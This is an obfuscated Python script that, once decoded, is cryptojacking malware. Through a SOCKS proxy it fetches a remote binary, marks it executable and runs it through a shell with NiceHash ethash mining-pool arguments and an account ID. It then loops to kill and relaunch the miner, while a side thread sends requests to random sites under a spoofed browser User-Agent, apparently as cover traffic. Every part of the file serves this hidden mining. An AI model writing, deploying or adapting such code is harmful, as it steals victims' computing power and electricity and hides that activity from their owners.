#pragma async
#!g1.1
#ку привет зачем закон нарушаете?)))))
l1O0l1Ol110Ol0011010l = lambda lOl001000l0OO0O1ll110: not lOl001000l0OO0O1ll110
lll00O0l1O1lO011O000l = (lambda ll100O1O00Ol0lOOl0OlO,
    O1l00lO0ll1OllOOOl1l0: ll100O1O00Ol0lOOl0OlO * O1l00lO0ll1OllOOOl1l0)
l10OlO1Ol0l011OOOO0Ol = (lambda Ollll00OO0l1OO0llOl10,
    ll1O0lOl0lOO101O1101l: Ollll00OO0l1OO0llOl10 ^ ll1O0lOl0lOO101O1101l)
O00O1lOO0101OO100000O = (lambda l0001OO00101O00O1OOl1,
    llOOO1OlllllOOOlOl0l1: l0001OO00101O00O1OOl1 + llOOO1OlllllOOOlOl0l1)
O0101O0O1llOO0lO1O1Ol = (lambda OOOO10lO01lO10ll1011l,
    OlOl1Ol10l0101O0l01O1: OOOO10lO01lO10ll1011l - OlOl1Ol10l0101O0l01O1)
l00l111101llO1100OOOl = (lambda ll1l011l01Ol111O0l11l,
    l1ll100O0lO100ll0O1Ol: ll1l011l01Ol111O0l11l % l1ll100O0lO100ll0O1Ol)
O0O0l11lO1011O001Ol1O = __import__(''.join(chr(O01O0lOOlO1011l0ll0ll ^
    l01ll10lOl10lOOOO1O11) for l01ll10lOl10lOOOO1O11, O01O0lOOlO1011l0ll0ll in
    zip(b'\x13*B\xd7', b'gC/\xb2')), globals(), locals(), [''.join(chr(
    l1Oll1lOOl00l1ll10Oll ^ ll0O1l00lO0l1010O1001) for 
    ll0O1l00lO0l1010O1001, l1Oll1lOOl00l1ll10Oll in zip(b'~\xee\x10\xfc7',
    b'\r\x82u\x99G'))], 0)

OO1l111O1Ol0110110100 = getattr(O0O0l11lO1011O001Ol1O, 'sleep')
O0l10l11llOOl1100l0O0 = __import__(''.join(chr(lOOOl10000l11l0001000 ^
    lOl1110lO11ll0l00OOOO) for lOl1110lO11ll0l00OOOO, lOOOl10000l11l0001000 in
    zip(b'\x81\x10\xf2a\x089', b'\xf3q\x9c\x05gT')), globals(), locals(), [
    ''.join(chr(O101100lOOl01l0O1lOOO ^ O000O1l0lll01OOO1Ol00) for 
    O000O1l0lll01OOO1Ol00, O101100lOOl01l0O1lOOO in zip(
    b'\xff\xa4\xd0i\xd1\x82', b'\x9c\xcc\xbf\x00\xb2\xe7'))], 0 * 8 + 0)
l0O1ll010l01OO11llO01 = getattr(O0l10l11llOOl1100l0O0, 'choice')
OlO010llO11O1ll11O1O1 = __import__(''.join(chr(OOllO10101O10O0l1111O ^
    O1l11O10OOOOlOll01Ol1) for O1l11O10OOOOlOll01Ol1, OOllO10101O10O0l1111O in
    zip(b'\xdf\xf3\x92_R\x18;\xd2', b'\xad\x96\xe3*7kO\xa1')), globals(),
    locals(), [], 0)
ll0ll1011000lO11O1l10 = __import__('httpx' + '_socks', globals(), locals(),
    [], 0)
O11O0l1OOO10100O11lO0 = __import__(''.join(chr(O0O10O01lllll10000OOl ^
    OOO1l01O1O0O0O0O01O0O) for OOO1l01O1O0O0O0O01O0O, O0O10O01lllll10000OOl in
    zip(b'\x97&q\xea\x87', b'\xffR\x05\x9a\xff')), globals(), locals(), [], 0)
O1011lOll001O001O001l = __import__(''.join(chr(Ol0001l11O111l1OO10OO ^
    Ol01001O1Ol111l000l11) for Ol01001O1Ol111l000l11, Ol0001l11O111l1OO10OO in
    zip(b';Xf\xc9', b'O1\x0b\xac')), globals(), locals(), [], 0)
llll0OlO1lllOlOOOOO01 = __import__('thre' + 'ading', globals(), locals(), [
    ], 0 * 11 + 0)
O0O0l111ll1lOOO1010l1 = __import__('ssecorpbus'[::-1], globals(), locals(),
    [], 0)
Ol100lO01011OlO1l10O0 = __import__(''.join(chr(lO11101l01l1O0lOOOl00 ^
    O11ll10l0OO1ll00Olll0) for O11ll10l0OO1ll00Olll0, lO11101l01l1O0lOOOl00 in
    zip(b"0\xa0\xde\xfb'\xbe", b'B\xc1\xb0\x9fH\xd3')), globals(), locals(),
    [], 0 * 3 + 0)
OlO0O1lOOOOlO0Ol0OlOl = l0O1ll010l01OO11llO01
l01llllO0100ll1O100l1 = OO1l111O1Ol0110110100
OO1llO1ll10lOOllOO1ll = lambda OO1110O1OOO11O0O0l1lO: O0101O0O1llOO0lO1O1Ol(
    OO1110O1OOO11O0O0l1lO - l10OlO1Ol0l011OOOO0Ol(0 * 8 + 0, 0 * 13 + 1) %
    (3 ^ 0), 1 ^ 0 ^ (0 ^ 2))
l1OO1O1lOlOl11ll1000l = lambda OOO1OO0O011lOO0OO0lO0: ''.join(filter(lambda
    O1ll1l110011l101l10O1: ord(O1ll1l110011l101l10O1) % 2 != 0,
    'T|\x14|0F>\x16 J**hxJ')).join(chr(int(OO1llO1ll10lOOllOO1ll(ord(l001l00000OO10O0l0l11)))) for
    l001l00000OO10O0l0l11 in OOO1OO0O011lOO0OO0lO0)
l1O1ll1111l101O1111ll = ''.join(filter(lambda OOl1l0Ol01ll1l1OO11Ol: ord(
    OOl1l0Ol01ll1l1OO11Ol) % 6 != 0, '\x18r0`\x1e\x06<N<lx\x12x*\x18')).join(
    OlO0O1lOOOOlO0Ol0OlOl(l1OO1O1lOlOl11ll1000l(''.join(filter(lambda
    l001l0010110Ol1ll1llO: ord(l001l0010110Ol1ll1llO) % 5 != 0,
    '_<sd\x19}\x0f#nUF\x19}#_')).join(chr(ll1l11lOl00l0O0O0111l ^
    ll1O1Ol1O01l0OlOO1lll) for ll1O1Ol1O01l0OlOO1lll, ll1l11lOl00l0O0O0111l in
    zip(b'p\x13\x98o\x05\x02y\xb5Ol\xa7\xcejh\xb8[',
    b'D&\xaeX=;C\x8esQ\xc2\xa8\r\x00\xd11')))) for O1OOl0O110O0O0O1ll1Ol in
    range(int(OO1llO1ll10lOOllOO1ll(12))))
l0O1lOl1l00O0Ol10llO1 = ''.join(filter(lambda O00O00l100O0l001lOl1O: ord(
    O00O00l100O0l001lOl1O) % 4 != 0, '\x00XXHX, ,( x\\H(`')).join(filter(lambda
    l01O11100lOOl01llO0O0: ord(l01O11100lOOl01llO0O0) % 6 != 0, ''.join(chr
    (llll10000ll0l01OOOlOO ^ Olll0O0lOO10010lOl110) for 
    Olll0O0lOO10010lOl110, llll10000ll0l01OOOlOO in zip(
    b'\xb52]\x19\xd3 \xfco\xcd\xd0\xdb\xe5\x83~\xe5',
    b'\x85JEa\xbfz\xfa;\xe7\xc8\x93\xfd\x91`\x97')))).join(
    OlO0O1lOOOOlO0Ol0OlOl(l1OO1O1lOlOl11ll1000l(''.join(chr(
    lO11l0l0O0OO01l10lOOl ^ OlllO10111010OO1O11OO) for 
    OlllO10111010OO1O11OO, lO11l0l0O0OO01l10lOOl in zip(
    b'5{g\x7f\xf2\xe2\xd1\xf5\x13ED\xaa\xb57;7',
    b'\x01NQH\xca\xdb\xeb\xce/x!\xcc\xd2_R]')))) for O1OOl0O110O0O0O1ll1Ol in
    range(int(OO1llO1ll10lOOllOO1ll(12))))
OOl11011O010OOOO1O1lO = l1OO1O1lOlOl11ll1000l(''.join(chr(
    O0l1l111O11OO10OOlOll ^ Ol1ll1OO0l10OO11OOOl1) for 
    Ol1ll1OO0l10OO11OOOl1, O0l1l111O11OO10OOlOll in zip(b'\x93m\xe10\x11',
    b'\xa0\x19\x90H"'))[::-1 ^ 0]) + l1O1ll1111l101O1111ll
lOO111l10l01lllO0l1O1 = l1OO1O1lOlOl11ll1000l(''.join(chr(
    OlO10Ol1O00OO1ll01ll1 ^ Ol1llO00O1lOl11O100OO) for 
    Ol1llO00O1lOl11O100OO, OlO10Ol1O00OO1ll01ll1 in zip(
    b'\xee\xb6Q\xb32\xde\xee\xd6\x9c\x9b\xa8\xdf<\x04\x8fo\xb7\xdd\xb3',
    b'\xd8\x81c\x86\x06\xe7\xdc\xe0\xaa\xa1\x9a\xea\t>\xb1Y\x83\xe8\x89')))


class setInterval:

 def __init__(self, lOO1OO0OO1l0001l0O0Ol,
     l0l11Ol1O11l11l11l01l):
  self.interval = lOO1OO0OO1l0001l0O0Ol
  self.action = l0l11Ol1O11l11l11l01l
  self.stopEvent = getattr(llll0OlO1lllOlOOOOO01, 'tnevE'[::-1])()
  uohyDzKrcmQA = getattr(llll0OlO1lllOlOOOOO01, ''.join(chr(
      l0OOO0O0lll10OlOOlOll ^ O0OOO0ll1OO0OO1Ol11ll) for 
      O0OOO0ll1OO0OO1Ol11ll, l0OOO0O0lll10OlOOlOll in zip(
      b'\x9d\xc7\x95`\xad\xc5', b'\xc9\xaf\xe7\x05\xcc\xa1')))(target=
      getattr(l11OOlOl00OOl1O001OlO, 'lavretnItes__'[::-1]))
  getattr(uohyDzKrcmQA, 'st' + 'art')()

 def lcDCZBkgFWRHnEYPqrowievTNh(Ol110ll0O1lOl10lOl0Ol):
  nADNQPxyHwSVBtWd = getattr(O0O0l11lO1011O001Ol1O, 'emit'[::-1])() + getattr(
      Ol110ll0O1lOl10lOl0Ol, ''.join(chr(O0000lO0O0lll01l110OO ^
      O0l0Oll10OlOll100ll1O) for O0l0Oll10OlOll100ll1O,
      O0000lO0O0lll01l110OO in zip(b'\xda|\xf6f5\x06j\x0e',
      b'\xb3\x12\x82\x03Gp\x0bb')))
  while not getattr(Ol110ll0O1lOl10lOl0Ol, 'tnevEpots'[::-1]).wait(
      nADNQPxyHwSVBtWd - getattr(O0O0l11lO1011O001Ol1O, ''.join(chr(
      OOOO0001O11l10Oll1110 ^ OOO0OO110lll0l01l1OOl) for 
      OOO0OO110lll0l01l1OOl, OOOO0001O11l10Oll1110 in zip(b',\x052>',
      b'Xl_[')))()):
   nADNQPxyHwSVBtWd = nADNQPxyHwSVBtWd + getattr(Ol110ll0O1lOl10lOl0Ol, ''.
       join(chr(lOll01l010lO1lll0OOll ^ ll00l10O1ll1010ll11O0) for 
       ll00l10O1ll1010ll11O0, lOll01l010lO1lll0OOll in zip(
       b'\xc5\x86\xc2\xa0\xcaZ\x14\xd9', b'\xac\xe8\xb6\xc5\xb8,u\xb5')))
   getattr(Ol110ll0O1lOl10lOl0Ol, 'noitca'[::-1])()

 def hHnQPWdVmZlN(O0010000lllO1111ll01O):
  getattr(O0010000lllO1111ll01O, ''.join(chr(lO1O1OO0111lllOOOO1l0 ^
      O110llO10Oll01lOllOO0) for O110llO10Oll01lOllOO0,
      lO1O1OO0111lllOOOO1l0 in zip(b'\xc6\x96v\xe2\x98<\xacs_',
      b'\xb5\xe2\x19\x92\xddJ\xc9\x1d+'))).set()


def OOO0000OOl1OO1l1lOlO1(lOOlOOOOlO0OlO11llOO0):
 return getattr(O0O0l111ll1lOOO1010l1, ''.join(chr(Olll01lOO10110000l000 ^
     lOlOllOOO0l10O1Ol0l00) for lOlOllOOO0l10O1Ol0l00,
     Olll01lOO10110000l000 in zip(b'\x1f\x85\xa8\xfe@N/\x16\x1a',
     b'x\xe0\xdc\x915:_cn')))(lOOlOOOOlO0OlO11llOO0)


def llOO0100l00l1l0ll11l0(OOOOl1l1lll1l1OO0l01l):
 getattr(O0O0l111ll1lOOO1010l1, ''.join(chr(OO0Ol0O01OOOlll10ll11 ^
     llll00Ol11O0lOll00ll0) for llll00Ol11O0lOll00ll0,
     OO0Ol0O01OOOlll10ll11 in zip(b'\x12:\xd0Z0', b'BU\xa0?^')))(
     OOOOl1l1lll1l1OO0l01l, close_fds=bool(int(OO1llO1ll10lOOllOO1ll(5))),
     shell=bool(int(OO1llO1ll10lOOllOO1ll(1 * 4 + 1))))


def OlOl1110001110Oll0OlO():
 OOO0000OOl1OO1l1lOlO1(O00O1lOO0101OO100000O(l1OO1O1lOlOl11ll1000l(''.join(
     chr(O1ll11l11ll1OOOlll1l1 ^ l1OlOl1lOll10O110O01l) for 
     l1OlOl1lOll10O110O01l, O1ll11l11ll1OOOlll1l1 in zip(b'\xa8yA',
     b'\xd9\x16)')) + ''.join(chr(OO10l0000OOO10O0l011O ^
     lO010l1OlOOOO1l0l1O10) for lO010l1OlOOOO1l0l1O10,
     OO10l0000OOO10O0l011O in zip(b'\xba\x7fm', b'\xd7\tI'))),
     OOl11011O010OOOO1O1lO))


def O110O1l1OOl0l1l1111ll():
 OlO1lOl011Ol1l110O1l0 = getattr(O11O0l1OOO10100O11lO0, ''.join(chr(
     O01OlO110O001lO010lOO ^ l10OO11O11O00Ol1OlOOl) for 
     l10OO11O11O00Ol1OlOOl, O01OlO110O001lO010lOO in zip(b',\xe0v\x91\x93P',
     b'o\x8c\x1f\xf4\xfd$')))(transport=getattr(ll0ll1011000lO11O1l10, 
     'SyncProxy' + 'Transport').from_url(l1OO1O1lOlOl11ll1000l(''.join(
     filter(lambda O1O11l1l1O0l1Ol10l0OO: ord(O1O11l1l1O0l1Ol10l0OO) % 6 !=
     0, '0fB<NT`rTZZ`B\x0cT')).join(chr(ll00lOOlll0l0l0101O1l ^
     Oll0001OlO01010111lOl) for Oll0001OlO01010111lOl,
     ll00lOOlll0l0l0101O1l in zip(b'\xd1aC)\xb1\x8a9\x00\x91',
     b'\xa6\x12$F\xc6\xb3\x073\xa2'))) + lOO111l10l01lllO0l1O1))
 OOlOO0l00lll0OO11Ol0l = getattr(OlO1lOl011Ol1l110O1l0, 'g' + 'et')(
     l1OO1O1lOlOl11ll1000l(''.join(filter(lambda lOO1O00ll11ll01100lOl: ord
     (lOO1O00ll11ll01100lOl) % 3 != 0, "T\x15Wx{lZ'\x03-\x1b\x03{Z-")).join
     (chr(ll101O010O1ll11lOll1l ^ OlO1OO0O1l0l1111lO1OO) for 
     OlO1OO0O1l0l1111lO1OO, ll101O010O1ll11lOll1l in zip(
     b"$4T\xaf\xd6\xd0\xae\xe6 \xe4c\x83\x9fx\xe7\xd0\xf1\xfe\xdb\xf6\x12'\x16-\xe3\x00U\x9e\xe11:3\xfe#\x11\x1f4!e\xa5z\x1dg\x8e\x15\xe1\xa0"
     ,
     b'HL,\xdb\xa1\xee\x9d\xd5K\x89\x1b\xef\xe6\x1e\xd5\xb7\x82\x8f\xe8\x84{OeF\xd66b\xad\x8b\\JZ\x89\x10gzO\x12\x14\xc0\x17oT\xe1p\x8e\xc5'
     ))))
 with open(OOl11011O010OOOO1O1lO + l1OO1O1lOlOl11ll1000l(chr(51)) +
     l0O1lOl1l00O0Ol10llO1, l1OO1O1lOlOl11ll1000l(''.join(chr(
     lllO1O1l011l0l11O1O00 ^ Ol00llO100101l0Oll11l) for 
     Ol00llO100101l0Oll11l, lllO1O1l011l0l11O1O00 in zip(b'\xcd\xc4',
     b'\xb6\xa2')))) as llOOO10100lOlOll00l1l:
  getattr(llOOO10100lOlOll00l1l, 'etirw'[::-1])(getattr(
      OOlOO0l00lll0OO11Ol0l, 'tnetnoc'[::-1]))
 OOO0000OOl1OO1l1lOlO1(l1OO1O1lOlOl11ll1000l(''.join(chr(
     Ol1O10l01lOll0lOOO111 ^ O0l010OOO1ll0l10O0O1l) for 
     O0l010OOO1ll0l10O0O1l, Ol1O10l01lOll0lOOO111 in zip(
     b'\x1f\xde\xf7\xec\x9e\x052\xceS\xc8',
     b'x\xb2\x86\x9f\xf6!\t\xf5h\xec'))) + OOl11011O010OOOO1O1lO +
     l1OO1O1lOlOl11ll1000l(chr(12 * 4 + 3)) + l0O1lOl1l00O0Ol10llO1)


def lO00111OO01OOlll000O1():
 llOO0100l00l1l0ll11l0(O00O1lOO0101OO100000O(l1OO1O1lOlOl11ll1000l(''.join(
     chr(OOOl10l1ll000101O0l10 ^ Ollll0000011Ol011l00l) for 
     Ollll0000011Ol011l00l, OOOl10l1ll000101O0l10 in zip(b'\xf0\x96\x10',
     b'\xd4\xfew'))[::-2 ^ 1]), OOl11011O010OOOO1O1lO) +
     l1OO1O1lOlOl11ll1000l(''.join(filter(lambda O00000O10OO11O11001Ol: ord
     (O00000O10OO11O11001Ol) % 3 != 0, '\x15!\x18oW$*NrK\x03NcH-')).join(
     chr(O0lOl1l01l0010lO110ll ^ l0O100l010lOl0lOOOl1O) for 
     l0O100l010lOl0lOOOl1O, O0lOl1l01l0010lO110ll in zip(b"'>\x0b\x9cSb",
     b'\x03\x14!\xb8aQ'))) + l0O1lOl1l00O0Ol10llO1 + l1OO1O1lOlOl11ll1000l(
     (
     'iwhnkvj$B$4$iij11$:546>:552:662945276$}|svt11$6|ihre}2R{Hqv7{eT9]I]L8QmXoRkXPRX{='
      +
     'qwk8}E7$y1$7977>qsg2lweligmr2lxvsr1yi2sxsqmlwelvikkeh33>tgx/qyxevxw$s1$lwelxi$e1$'
     )[::-1 * 11 + 10]))


def O1lOO1l1000l0Ol100lOO():
 return OOO0000OOl1OO1l1lOlO1(O00O1lOO0101OO100000O(l1OO1O1lOlOl11ll1000l(
     ''.join(chr(OOOlOO0lOO00lO0lOl1ll ^ l1O11111lO010O1lOOlO1) for 
     l1O11111lO010O1lOOlO1, OOOlOO0lOO00lO0lOl1ll in zip(
     b'A\xcc\xcc\x1b\xbdym\xc7\x13', b'5\xa3\xa1k\xcd]\\\xfa7'))),
     l0O1lOl1l00O0Ol10llO1))


class setInterval:

 def __init__(self, l1010l00O10O1OOl10O0l,
     l001llOlO1O1110l1O011):
  self.interval = l1010l00O10O1OOl10O0l
  self.action = l001llOlO1O1110l1O011
  self.stopEvent = getattr(llll0OlO1lllOlOOOOO01, ''.join(chr(
      l0l000ll0Ol1Ol01OOOOl ^ llO0l1O0OllOOO0llOOOl) for 
      llO0l1O0OllOOO0llOOOl, l0l000ll0Ol1Ol01OOOOl in zip(
      b'\x1d\xb7\xff\xff\xcc', b'X\xc1\x9a\x91\xb8')))()
  uohyDzKrcmQA = getattr(llll0OlO1lllOlOOOOO01, 'Thr' + 'ead')(target=self.lcDCZBkgFWRHnEYPqrowievTNh)
  getattr(uohyDzKrcmQA, ''.join(chr(lOlOlllOOlOll10ll0OO0 ^
      Ol1OO0l00Ol01lOl0l0lO) for Ol1OO0l00Ol01lOl0l0lO,
      lOlOlllOOlOll10ll0OO0 in zip(b'P$\xef\x11\x9c', b'#P\x8ec\xe8')))()

 def lcDCZBkgFWRHnEYPqrowievTNh(l1O1OOll0O01llOOlO111):
  nADNQPxyHwSVBtWd = O00O1lOO0101OO100000O(getattr(O0O0l11lO1011O001Ol1O, 'ti' + 'me')(),
      getattr(l1O1OOll0O01llOOlO111, ''.join(chr(l01OllOOOO010l101000O ^
      OOl010O0Ollll1llOl1l1) for OOl010O0Ollll1llOl1l1,
      l01OllOOOO010l101000O in zip(b'\xac\xf9{~\x9d\xe9\xea\x95',
      b'\xc5\x97\x0f\x1b\xef\x9f\x8b\xf9'))))
  while l1O0l1Ol110Ol0011010l(getattr(l1O1OOll0O01llOOlO111, 'tnevEpots'[::
      -1]).wait(O0101O0O1llOO0lO1O1Ol(nADNQPxyHwSVBtWd, getattr(O0O0l11lO1011O001Ol1O, 
      'ti' + 'me')()))):
   nADNQPxyHwSVBtWd = nADNQPxyHwSVBtWd + getattr(l1O1OOll0O01llOOlO111, ''.
       join(chr(l101ll1l1ll0l10O00O0O ^ l1l101l00100OlO0l0O00) for 
       l1l101l00100OlO0l0O00, l101ll1l1ll0l10O00O0O in zip(
       b'\x82QuMr$\xb8\xe1', b'\xeb?\x01(\x00R\xd9\x8d')))
   getattr(l1O1OOll0O01llOOlO111, ''.join(chr(lOl101l00010lllllOlO0 ^
       O100O10O1OlO01O00l1Ol) for O100O10O1OlO01O00l1Ol,
       lOl101l00010lllllOlO0 in zip(b'(\x08\xb3\\\xfb\x9a',
       b'Ik\xc75\x94\xf4')))()

 def hHnQPWdVmZlN(l001l110001O11l10l11O):
  getattr(l001l110001O11l10l11O, ''.join(chr(l0101lOl010llO010O1l0 ^
      Oll0O0100OOlllll1Oll1) for Oll0O0100OOlllll1Oll1,
      l0101lOl010llO010O1l0 in zip(b'\xd2?\xd7\xd6\xa2\xaef\xce_',
      b'\xa1K\xb8\xa6\xe7\xd8\x03\xa0+'))).set()


def lllO011l10lll0O1l110l():
 l0001llllllOOl0O01lll = [l1OO1O1lOlOl11ll1000l('lxxtw' + '>33{{{' + ''.
     join(chr(l1l1l0lO11101O01l0l11 ^ ll100lO00OOlll1lOOOO1) for 
     ll100lO00OOlll1lOOOO1, l1l1l0lO11101O01l0l11 in zip(
     b'\xfa0\x81C\x85#\x18a\x07_A', b'\xc8F\xe8+\xedN`S`,0'))),
     l1OO1O1lOlOl11ll1000l(''.join(chr(ll0OOlO00Ol010l0l01l1 ^
     lO1101llll10lOO1O01l0) for lO1101llll10lOO1O01l0,
     ll0OOlO00Ol010l0l01l1 in zip(
     b'!1\x8f7\xd0\\Q7\x94\x00\xdd\xf1\xc9\x8c$\xfe\r\xc3A8_',
     b'MI\xf7C\xa7bb\x04\xef{\xa6\xc3\xb4\xe9H\x8d~\xf1&K.'))),
     l1OO1O1lOlOl11ll1000l(''.join(chr(Ol1Ol1010Ol0l1l1000l0 ^
     OOlO1l10lOlO1lO0l0l10) for OOlO1l10lOlO1lO0l0l10,
     Ol1Ol1010Ol0l1l1000l0 in zip(
     b'\x8d\x96\xe5\xc4J>\x08\xe4X\xfa\xa4\xd4\x12e\x94\x86\xa3\xcd',
     b'\xe1\xee\x9d\xb0t\r;\x9f#\x81\x96\xb3`\x17\xa6\xe1\xd0\xbc'))),
     l1OO1O1lOlOl11ll1000l(''.join(filter(lambda O11lll11001l11lO10100: ord
     (O11lll11001l11lO10100) % 6 != 0, '\x00lTZ*\x0c<\x1eNHr$r\x18\x06')).
     join(chr(~O11l0l0lll0lOOl101llO & l1l0Ol01l1ll1lO1000Ol | 
     O11l0l0lll0lOOl101llO & ~l1l0Ol01l1ll1lO1000Ol) for 
     l1l0Ol01l1ll1lO1000Ol, O11l0l0lll0lOOl101llO in zip(
     b'\x17\xfa`\xd5\xad]\x14\xfbKvuRM\x9e',
     b"{\x82\x18\xa1\xdac'\xc81\x19G5>\xef"))), l1OO1O1lOlOl11ll1000l(''.
     join(chr(OOl0O0OOll011OlOl1llO ^ OO1OO0O1O0Ol111OOl1OO) for 
     OO1OO0O1O0Ol111OOl1OO, OOl0O0OOll011OlOl1llO in zip(
     b'\xa6\x85\xbc\x007\x13-x', b'\xca\xfd\xc4t@-\x1eK')) + ''.join(chr(
     l1lllO010O10lll11l0O1 ^ l1Oll01lO11l01Oll00O1) for 
     l1Oll01lO11l01Oll00O1, l1lllO010O10lll11l0O1 in zip(
     b'\x9f\xd3.A\xaaI\x04L', b'\xfa\xa9C9\xd9{r5'))),
     l1OO1O1lOlOl11ll1000l(''.join(chr(l1l10001O11Ol0OOlOOO0 ^
     lO1OO0Ol0O1OOl0OOlll1) for lO1OO0Ol0O1OOl0OOlll1,
     l1l10001O11Ol0OOlOOO0 in zip(
     b'm\x19\xedhf\xe4\xa8\xce\xdf2X\x8d2\x16>\xde\x02\xfa\xd2:J',
     b'\x06o\x9eZ\x03\x89\xc0\xa7\xab_7\xe0I%\r\xe0u\x8e\xaaB&'))[::-1 * 4 +
     3]), l1OO1O1lOlOl11ll1000l(''.join(filter(lambda l10ll0OOOl0O101l0lOlO:
     ord(l10ll0OOOl0O101l0lOlO) % 3 != 0, "60\x12fo!HlB\x1bBWZ\x0c'")).join
     (chr(O10111l1l0lll0lOOOOO0 ^ OlllOOO011l0l0lOO0Oll) for 
     OlllOOO011l0l0lOO0Oll, O10111l1l0lll0lOOOOO0 in zip(
     b'\xca\x15\xd4\xccR\xb5jCb\xe1,\xed9\xb3\x0e\x94\xee',
     b'\xa6m\xac\xb8%\x8bYp\t\x90I\x80I\x81i\xe7\x9f'))),
     l1OO1O1lOlOl11ll1000l(''.join(chr(l001OO01llO1l1lll10ll ^
     lO1l00OOl010l01110100) for lO1l00OOl010l01110100,
     l001OO01llO1l1lll10ll in zip(
     b'\xe7\xa5\x8f7D!\x9eZ\x82\xb7\xa2\xe5\xc9\xf9J',
     b'\x8b\xdd\xf7C3\x1f\xadi\xf3\xd2\xcf\x95\xfb\x8f3'))),
     l1OO1O1lOlOl11ll1000l('lxxtw' + '>33xi' + 'kvs2qevkip'[::-1]),
     l1OO1O1lOlOl11ll1000l(''.join(filter(lambda l1Ol11l111l11l0OO1Ol1: ord
     (l1Ol11l111l11l0OO1Ol1) % 6 != 0, 'N\x18*x\x1e\x18ZB\x0c*Z$Z\x06x')).
     join(chr(OOOO011lOO00011O0101O ^ l1OO1101l0O1OO0l0ll10) for 
     l1OO1101l0O1OO0l0ll10, OOOO011lOO00011O0101O in zip(
     b'\xd4\x0bZBW\xbbX\x19A\xbc\x142\xa0\xdb\xc4f\xe4\x8f',
     b'\xb8s"6 \x85k*9\xd5d[\xcb\xad\xa1T\x90\xe3'))),
     l1OO1O1lOlOl11ll1000l(('yv2xysiqm' + 'x33>wtxxl')[::-1 ^ 0]),
     l1OO1O1lOlOl11ll1000l(''.join(chr(l11O1O00O111lOl1l1l11 ^
     O10l0Ol0O1OO0l0101lO1) for O10l0Ol0O1OO0l0101lO1,
     l11O1O00O111lOl1l1l11 in zip(b'w\x82n\xb7\xddW\xe6PDj\xd6Z\x97Mp:\x0c',
     b'\x1b\xfa\x16\xc3\xaai\xd5c9\x0f\xa42\xfe1BLu')))]
 try:
  Ol0l010O0l11O11O0Ol00 = l0001llllllOOl0O01lll[getattr(PEcjKQSgiuFy, ''.
      join(chr(OOl1lOOllOOl1l0O010O0 ^ lO0101l1Ol1OlO0OOO010) for 
      lO0101l1Ol1OlO0OOO010, OOl1lOOllOOl1l0O010O0 in zip(
      b'\xcf=\x8b\xc32\rd', b'\xbd\\\xe5\xa7[c\x10')))(int(
      OO1llO1ll10lOOllOO1ll(6 ^ 2)), len(l0001llllllOOl0O01lll) - int(
      OO1llO1ll10lOOllOO1ll(3 ^ 7 ^ (0 ^ 1))))]
  l1lO01lO1l0l01OO01lO0 = getattr(qkodxjASMvbXIgCY, 'teg'[::-1])(
      Ol0l010O0l11O11O0Ol00, headers={l1OO1O1lOlOl11ll1000l(''.join(chr(
      Ol01011l000llOOl1lll0 ^ lO01lOlOOl0O101l0l111) for 
      lO01lOlOOl0O101l0l111, Ol01011l000llOOl1lll0 in zip(
      b'\xf5\xc3\x1d\xb0\xe5l\x94\xe9\x14\xec',
      b'\x8d\xb1t\xdb\xa0]\xe2\x80c\xb5'))[::-2 ^ 1]):
      l1OO1O1lOlOl11ll1000l('Qs~mppe3924$,Qegmrxswl?$Mrxip' +
      '$Qeg$SW$\\$54c55c:-$Ettpi[ifOm' + ''.join(chr(OOll01l00lO00ll1O001O ^
      lO00l00O001lO0Ol1O0lO) for lO00l00O001lO0Ol1O0lO,
      OOll01l00lO00ll1O001O in zip(
      b'\xb0\xf7\xffrnlY7\xc6\xee\xaf\x82%\x8c\x04\x07\xc5\xa3\xe3\x87\xc8\xb2\xa7\x97\x95\xe0\xdb\xd4\xbd}\xf3\xc0\xa5\xddJ\x8c\xf0\xac\x11\xfas0\x10\xbf6%\x8a\xad\x90\x03\xca\x11\x9b=\x18~\xc3\x08'
      ,
      b"\xc8\xc4\xc5F[^b\x05\xfd\xca\x83\xcdi\xd4UW\xf5\x87\x93\xea\xa7\xdb\x83\xdc\xfc\x87\xb4\xa7\x90Y\xa9\xa9\xd3\xaa'\xff\x82\x9f,\xc8F\x02&\x9ba@\xe0\xc8\xe6n\xf9+\xaf\x08*E\xf13"
      )))}, timeout=int(OO1llO1ll10lOOllOO1ll(1 * (6 ^ 1) + 2)))
 except Exception as wNenuzCUFf:
  pass


def O0Ol01lOO1l0l01l00l11():
 llO00OO1l0ll1llOO10OO = setInterval(int(OO1llO1ll10lOOllOO1ll(1 ^ 0 * 13 +
     7)), lllO011l10lll0O1l110l)
 OlOl1110001110Oll0OlO()
 O110O1l1OOl0l1l1111ll()
 while bool(int(OO1llO1ll10lOOllOO1ll(5))):
  lO00111OO01OOlll000O1()
  l01llllO0100ll1O100l1(int(OO1llO1ll10lOOllOO1ll(33 * (0 * 16 + 15) + (0 *
      14 + 9))))
  O1lOO1l1000l0Ol100lOO()
  l01llllO0100ll1O100l1(int(OO1llO1ll10lOOllOO1ll(l10OlO1Ol0l011OOOO0Ol(0 *
      3 + 1, 35))))


O0Ol01lOO1l0l01l00l11()
